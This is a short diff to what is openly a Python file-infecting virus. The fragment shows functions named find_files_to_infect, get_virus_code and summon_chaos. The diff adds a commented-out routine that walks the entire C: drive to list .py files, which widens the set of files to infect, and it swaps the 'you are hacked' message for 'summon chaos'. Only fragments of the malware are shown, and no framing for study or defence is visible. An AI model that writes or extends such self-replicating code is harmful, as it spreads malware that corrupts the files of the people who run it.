@@ -12,7 +12,18 @@ def search_in_directories(directories, file_extension=".py"):
   
     return search_results
 
+"""
+# this is the code to search in the whole drive
 
+def search_windows(file_extension=".py", drive="C:\\"):
+    search_results = []
+    for root, dirs, files in os.walk(drive, onerror=lambda e: None):  # Skip inaccessible directories
+        for file in files:
+            if file.endswith(file_extension):
+                search_results.append(os.path.join(root, file))
+
+    return search_results
+"""
 def find_files_to_infect(directory = "."):
     return [file for file in glob.glob("*.py")]
 
@@ -61,7 +72,7 @@ def get_virus_code():
     return virus_code
 
 def summon_chaos():
-    print("you are hacked")
+    print("summon chaos")
 
 
 try:
